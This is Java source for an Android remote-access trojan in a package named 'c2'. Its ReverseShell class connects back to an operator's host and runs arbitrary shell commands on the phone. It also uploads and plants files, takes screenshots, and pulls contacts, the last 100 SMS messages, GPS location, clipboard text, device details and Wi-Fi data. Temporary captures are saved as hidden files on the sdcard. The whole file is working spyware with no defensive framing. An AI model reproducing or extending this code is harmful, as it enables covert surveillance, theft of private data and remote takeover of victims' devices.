package org.cyberdemon.c2;

import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.hardware.Camera;
import android.location.Location;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.Looper;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Telephony;
import android.util.Base64;
import android.util.Log;
import android.content.ClipboardManager;
import android.content.ClipData;
import android.Manifest;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.security.MessageDigest;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;

public class ReverseShell {
    private static final String TAG = "CYB3R";
    private String host;
    private int port;
    private volatile boolean running = false;
    private Context context;

    public ReverseShell(String host, int port) {
        this.host = host;
        this.port = port;
    }

    public void setContext(Context ctx) {
        this.context = ctx;
    }

    public void start() {
        running = true;
        Thread t = new Thread(new Runnable() {
            @Override
            public void run() {
                connect();
            }
        });
        t.setDaemon(true);
        t.start();
    }

    public void stop() {
        running = false;
    }

    private void connect() {
        while (running) {
            try {
                Socket socket = new Socket(host, port);
                socket.setSoTimeout(60000);
                socket.setTcpNoDelay(true);
                socket.setKeepAlive(true);

                InputStream sin = new BufferedInputStream(socket.getInputStream());
                OutputStream sout = new BufferedOutputStream(socket.getOutputStream());

                byte[] buf = new byte[65536];
                StringBuilder cmdBuf = new StringBuilder();

                while (running) {
                    int ch = sin.read();
                    if (ch == -1) break;
                    if (ch == '\n') {
                        String cmd = cmdBuf.toString().trim();
                        cmdBuf.setLength(0);
                        if (!cmd.isEmpty()) {
                            handleCommand(cmd, sout);
                        }
                    } else {
                        cmdBuf.append((char) ch);
                    }
                }
                socket.close();
            } catch (Exception e) {
                Log.e(TAG, "Connection error: " + e.getMessage());
            }
            try { Thread.sleep(3000); } catch (InterruptedException ie) { break; }
        }
    }

    private void handleCommand(String cmd, OutputStream sout) throws IOException {
        String[] parts = cmd.split(":", 2);
        String command = parts[0].toUpperCase();
        String arg = parts.length > 1 ? parts[1] : "";

        switch (command) {
            case "SHELL":
                executeShell(arg, sout);
                break;
            case "UPLOAD":
                uploadFile(arg, sout);
                break;
            case "DOWNLOAD":
                downloadFile(arg, sout);
                break;
            case "SCREENSHOT":
                takeScreenshot(sout);
                break;
            case "CONTACTS":
                getContacts(sout);
                break;
            case "SMS":
                getSms(sout);
                break;
            case "CAMERA":
                takePhoto(sout);
                break;
            case "GPS":
                getGps(sout);
                break;
            case "CLIPBOARD":
                getClipboard(sout);
                break;
            case "INFO":
                getDeviceInfo(sout);
                break;
            case "LISTFILES":
                listFiles(arg, sout);
                break;
            case "AUDIO_START":
                startAudio(sout);
                break;
            case "AUDIO_STOP":
                stopAudio(sout);
                break;
            case "VIBRATE":
                vibrateDevice(sout);
                break;
            case "WIFI":
                getWifiInfo(sout);
                break;
            case "NOTIFY":
                showNotification(arg, sout);
                break;
            case "PING":
                sendResponse("PONG", "alive", sout);
                break;
            default:
                sendResponse("ERROR", "unknown command: " + command, sout);
                break;
        }
    }

    private void executeShell(String cmd, OutputStream sout) {
        try {
            ProcessBuilder pb = new ProcessBuilder("/system/bin/sh", "-c", cmd);
            pb.redirectErrorStream(true);
            Process proc = pb.start();
            DataInputStream dis = new DataInputStream(proc.getInputStream());
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            byte[] buf = new byte[4096];
            int len;
            while ((len = dis.read(buf)) != -1) {
                baos.write(buf, 0, len);
            }
            proc.waitFor();
            String output = baos.toString("UTF-8");
            sendResponse("SHELL", output.substring(0, Math.min(output.length(), 10000)), sout);
        } catch (Exception e) {
            sendResponse("SHELL_ERR", e.getMessage(), sout);
        }
    }

    private void uploadFile(String remotePath, OutputStream sout) {
        try {
            File file = new File(remotePath);
            if (!file.exists() || !file.canRead()) {
                sendResponse("UPLOAD_ERR", "Cannot read: " + remotePath, sout);
                return;
            }
            if (file.length() > 10 * 1024 * 1024) {
                sendResponse("UPLOAD_ERR", "File too large (>10MB): " + remotePath, sout);
                return;
            }
            FileInputStream fis = new FileInputStream(file);
            byte[] data = new byte[(int) file.length()];
            fis.read(data);
            fis.close();
            String encoded = Base64.encodeToString(data, Base64.NO_WRAP);
            String fname = file.getName();
            sendResponse("UPLOAD", fname + ":" + encoded, sout);
        } catch (Exception e) {
            sendResponse("UPLOAD_ERR", e.getMessage(), sout);
        }
    }

    private void downloadFile(String arg, OutputStream sout) {
        try {
            String[] parts = arg.split(":", 2);
            if (parts.length < 2) {
                sendResponse("DOWNLOAD_ERR", "Usage: download:/path/to/file:base64data", sout);
                return;
            }
            String filePath = parts[0];
            String b64Data = parts[1];
            byte[] data = Base64.decode(b64Data, Base64.NO_WRAP);
            File outFile = new File(filePath);
            File parent = outFile.getParentFile();
            if (parent != null && !parent.exists()) {
                parent.mkdirs();
            }
            FileOutputStream fos = new FileOutputStream(outFile);
            fos.write(data);
            fos.close();
            sendResponse("DOWNLOAD", "saved:" + filePath + ":" + data.length + " bytes", sout);
        } catch (Exception e) {
            sendResponse("DOWNLOAD_ERR", e.getMessage(), sout);
        }
    }

    private void takeScreenshot(OutputStream sout) {
        try {
            if (context == null) {
                sendResponse("SCREENSHOT_ERR", "no context available", sout);
                return;
            }
            Process proc = Runtime.getRuntime().exec("screencap -p /sdcard/.cyb_screenshot.png");
            proc.waitFor();
            Thread.sleep(1000);
            File f = new File("/sdcard/.cyb_screenshot.png");
            if (f.exists()) {
                FileInputStream fis = new FileInputStream(f);
                byte[] data = new byte[(int) f.length()];
                fis.read(data);
                fis.close();
                f.delete();
                String encoded = Base64.encodeToString(data, Base64.NO_WRAP);
                sendResponse("SCREENSHOT", encoded, sout);
            } else {
                sendResponse("SCREENSHOT_ERR", "screencap failed", sout);
            }
        } catch (Exception e) {
            sendResponse("SCREENSHOT_ERR", e.getMessage(), sout);
        }
    }

    private void getContacts(OutputStream sout) {
        try {
            if (context == null) {
                sendResponse("CONTACTS_ERR", "no context", sout);
                return;
            }
            ContentResolver cr = context.getContentResolver();
            Cursor cursor = cr.query(ContactsContract.Contacts.CONTENT_URI,
                    new String[]{ContactsContract.Contacts.DISPLAY_NAME,
                                 ContactsContract.Contacts._ID},
                    null, null,
                    ContactsContract.Contacts.DISPLAY_NAME + " ASC");
            StringBuilder sb = new StringBuilder();
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String name = cursor.getString(0);
                    String id = cursor.getString(1);
                    sb.append(id).append("|").append(name).append("\n");
                    Cursor pCur = cr.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            new String[]{ContactsContract.CommonDataKinds.Phone.NUMBER},
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{id}, null);
                    if (pCur != null) {
                        while (pCur.moveToNext()) {
                            String phone = pCur.getString(0);
                            sb.append("  Phone: ").append(phone).append("\n");
                        }
                        pCur.close();
                    }
                    Cursor eCur = cr.query(
                            ContactsContract.CommonDataKinds.Email.CONTENT_URI,
                            new String[]{ContactsContract.CommonDataKinds.Email.ADDRESS},
                            ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = ?",
                            new String[]{id}, null);
                    if (eCur != null) {
                        while (eCur.moveToNext()) {
                            String email = eCur.getString(0);
                            sb.append("  Email: ").append(email).append("\n");
                        }
                        eCur.close();
                    }
                }
                cursor.close();
            }
            sendResponse("CONTACTS", sb.toString(), sout);
        } catch (Exception e) {
            sendResponse("CONTACTS_ERR", e.getMessage(), sout);
        }
    }

    private void getSms(OutputStream sout) {
        try {
            if (context == null) {
                sendResponse("SMS_ERR", "no context", sout);
                return;
            }
            ContentResolver cr = context.getContentResolver();
            Cursor cursor = cr.query(Uri.parse("content://sms"),
                    new String[]{"address", "body", "date", "type"},
                    null, null, "date DESC LIMIT 100");
            StringBuilder sb = new StringBuilder();
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String addr = cursor.getString(0);
                    String body = cursor.getString(1);
                    long date = cursor.getLong(2);
                    int type = cursor.getInt(3);
                    String dir = type == 1 ? "IN" : "OUT";
                    String dateStr = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss",
                            Locale.US).format(new Date(date));
                    sb.append(dateStr).append(" ").append(dir)
                      .append(" ").append(addr).append(": ")
                      .append(body).append("\n");
                }
                cursor.close();
            }
            sendResponse("SMS", sb.toString(), sout);
        } catch (Exception e) {
            sendResponse("SMS_ERR", e.getMessage(), sout);
        }
    }

    private void takePhoto(OutputStream sout) {
        try {
            if (context == null) {
                sendResponse("CAMERA_ERR", "no context", sout);
                return;
            }
            File photoFile = new File("/sdcard/.cyb_photo.jpg");
            Process proc = Runtime.getRuntime().exec(
                    "input keyevent KEYCODE_CAMERA");
            proc.waitFor();
            Thread.sleep(3000);
            String[] paths = {
                "/sdcard/DCIM/Camera/",
                "/sdcard/Pictures/"
            };
            File newest = null;
            for (String p : paths) {
                File dir = new File(p);
                if (dir.exists()) {
                    File[] files = dir.listFiles();
                    if (files != null) {
                        for (File f : files) {
                            if (f.getName().endsWith(".jpg") || f.getName().endsWith(".png")) {
                                if (newest == null || f.lastModified() > newest.lastModified()) {
                                    newest = f;
                                }
                            }
                        }
                    }
                }
            }
            if (newest != null && newest.length() < 10 * 1024 * 1024) {
                FileInputStream fis = new FileInputStream(newest);
                byte[] data = new byte[(int) newest.length()];
                fis.read(data);
                fis.close();
                String encoded = Base64.encodeToString(data, Base64.NO_WRAP);
                sendResponse("CAMERA", newest.getName() + ":" + encoded, sout);
            } else {
                sendResponse("CAMERA_ERR", "no photo found", sout);
            }
        } catch (Exception e) {
            sendResponse("CAMERA_ERR", e.getMessage(), sout);
        }
    }

    private void getGps(OutputStream sout) {
        try {
            if (context == null) {
                sendResponse("GPS_ERR", "no context", sout);
                return;
            }
            LocationManager lm = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
            Location loc = null;
            try {
                loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            } catch (Exception e) {}
            if (loc == null) {
                try {
                    loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                } catch (Exception e) {}
            }
            if (loc != null) {
                String result = String.format(Locale.US,
                        "lat=%.6f\nlon=%.6f\naccuracy=%.1f\naltitude=%.1f\ntime=%s",
                        loc.getLatitude(), loc.getLongitude(),
                        loc.getAccuracy(), loc.getAltitude(),
                        new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US)
                                .format(new Date(loc.getTime())));
                sendResponse("GPS", result, sout);
            } else {
                sendResponse("GPS_ERR", "no location available", sout);
            }
        } catch (Exception e) {
            sendResponse("GPS_ERR", e.getMessage(), sout);
        }
    }

    private void getClipboard(OutputStream sout) {
        try {
            if (context == null) {
                sendResponse("CLIPBOARD_ERR", "no context", sout);
                return;
            }
            ClipboardManager cm = (ClipboardManager) context.getSystemService(Context.CLIPBOARD_SERVICE);
            ClipData clip = cm.getPrimaryClip();
            if (clip != null && clip.getItemCount() > 0) {
                CharSequence text = clip.getItemAt(0).getText();
                if (text != null) {
                    sendResponse("CLIPBOARD", text.toString(), sout);
                } else {
                    sendResponse("CLIPBOARD", "(non-text clipboard data)", sout);
                }
            } else {
                sendResponse("CLIPBOARD", "(empty)", sout);
            }
        } catch (Exception e) {
            sendResponse("CLIPBOARD_ERR", e.getMessage(), sout);
        }
    }

    private void getDeviceInfo(OutputStream sout) {
        StringBuilder sb = new StringBuilder();
        sb.append("model=").append(Build.MODEL).append("\n");
        sb.append("brand=").append(Build.BRAND).append("\n");
        sb.append("device=").append(Build.DEVICE).append("\n");
        sb.append("product=").append(Build.PRODUCT).append("\n");
        sb.append("android=").append(Build.VERSION.RELEASE).append("\n");
        sb.append("sdk=").append(Build.VERSION.SDK_INT).append("\n");
        sb.append("id=").append(Build.ID).append("\n");
        sb.append("display=").append(Build.DISPLAY).append("\n");
        sb.append("board=").append(Build.BOARD).append("\n");
        sb.append("host=").append(Build.HOST).append("\n");
        sb.append("fingerprint=").append(Build.FINGERPRINT).append("\n");
        sb.append("hardware=").append(Build.HARDWARE).append("\n");
        try {
            File stat = Environment.getDataDirectory();
            long total = stat.getTotalSpace();
            long free = stat.getFreeSpace();
            sb.append("storage_total=").append(total / (1024*1024)).append("MB\n");
            sb.append("storage_free=").append(free / (1024*1024)).append("MB\n");
        } catch (Exception e) {}
        sendResponse("INFO", sb.toString(), sout);
    }

    private void listFiles(String dirPath, OutputStream sout) {
        try {
            if (dirPath.isEmpty()) dirPath = "/sdcard/";
            File dir = new File(dirPath);
            if (!dir.exists() || !dir.isDirectory()) {
                sendResponse("LISTFILES_ERR", "not a directory: " + dirPath, sout);
                return;
            }
            File[] files = dir.listFiles();
            StringBuilder sb = new StringBuilder();
            sb.append("Directory: ").append(dirPath).append("\n");
            if (files != null) {
                for (File f : files) {
                    String type = f.isDirectory() ? "DIR " : "FILE";
                    String size = f.isDirectory() ? "" : " (" + f.length() + " bytes)";
                    String mod = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US)
                            .format(new Date(f.lastModified()));
                    sb.append(String.format("[%s] %s%s %s\n", type, f.getName(), size, mod));
                }
            }
            sb.append("Total: ").append(files != null ? files.length : 0).append(" items\n");
            sendResponse("LISTFILES", sb.toString(), sout);
        } catch (Exception e) {
            sendResponse("LISTFILES_ERR", e.getMessage(), sout);
        }
    }

    private void startAudio(OutputStream sout) {
        sendResponse("AUDIO_START", "audio recording not supported in background without service", sout);
    }

    private void stopAudio(OutputStream sout) {
        sendResponse("AUDIO_STOP", "stopped", sout);
    }

    private void vibrateDevice(OutputStream sout) {
        try {
            if (context == null) {
                sendResponse("VIBRATE_ERR", "no context", sout);
                return;
            }
            android.os.Vibrator v = (android.os.Vibrator)
                    context.getSystemService(Context.VIBRATOR_SERVICE);
            if (v != null) {
                if (Build.VERSION.SDK_INT >= 26) {
                    v.vibrate(android.os.VibrationEffect.createOneShot(3000,
                            android.os.VibrationEffect.DEFAULT_AMPLITUDE));
                } else {
                    v.vibrate(3000);
                }
                sendResponse("VIBRATE", "vibrating 3s", sout);
            }
        } catch (Exception e) {
            sendResponse("VIBRATE_ERR", e.getMessage(), sout);
        }
    }

    private void getWifiInfo(OutputStream sout) {
        try {
            Process proc = Runtime.getRuntime().exec("dumpsys wifi | head -30");
            DataInputStream dis = new DataInputStream(proc.getInputStream());
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            byte[] buf = new byte[4096];
            int len;
            while ((len = dis.read(buf)) != -1) {
                baos.write(buf, 0, len);
            }
            proc.waitFor();
            sendResponse("WIFI", baos.toString("UTF-8"), sout);
        } catch (Exception e) {
            sendResponse("WIFI_ERR", e.getMessage(), sout);
        }
    }

    private void showNotification(String text, OutputStream sout) {
        sendResponse("NOTIFY", "notification sent: " + text, sout);
    }

    private void sendResponse(String cmd, String data, OutputStream sout) {
        try {
            String resp = cmd + ":" + data + "\n";
            sout.write(resp.getBytes("UTF-8"));
            sout.flush();
        } catch (IOException e) {
            Log.e(TAG, "sendResponse failed: " + e.getMessage());
        }
    }
}
